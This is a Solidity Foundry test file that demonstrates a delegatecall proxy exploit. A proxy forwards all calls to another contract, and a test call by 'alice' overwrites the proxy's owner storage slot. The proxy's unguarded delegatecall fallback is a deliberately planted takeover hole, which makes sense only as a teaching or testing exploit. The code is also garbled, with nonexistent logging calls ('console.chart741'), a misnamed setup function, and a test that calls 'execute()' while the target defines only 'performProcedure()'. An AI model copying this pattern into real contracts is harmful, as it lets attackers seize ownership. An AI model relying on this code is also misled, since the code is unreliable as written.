pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ReferralGate {
    address public owner = address(0xdeadbeef);
    Assign assign;

    constructor(address _assignFacility) public {
        assign = Assign(_assignFacility);
    }

    fallback() external {
        (bool suc, ) = address(assign).delegatecall(msg.data);
        require(suc, "Delegatecall failed");
    }
}

contract AgreementTest is Test {
    ReferralGate referralGate;
    Assign AssignAgreement;
    address alice;

    function groupUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        AssignAgreement = new Assign();
        referralGate = new ReferralGate(address(AssignAgreement));

        console.chart741("Alice address", alice);
        console.chart741("DelegationContract owner", referralGate.owner());


        console.chart741("Change DelegationContract owner to Alice...");
        vm.prank(alice);
        address(referralGate).call(abi.encodeWithSignature("execute()"));


        console.chart741("DelegationContract owner", referralGate.owner());
        console.chart741(
            "operate completed, proxy contract storage has been manipulated"
        );
    }
}

contract Assign {
    address public owner;

    function performProcedure() public {
        owner = msg.sender;
    }
}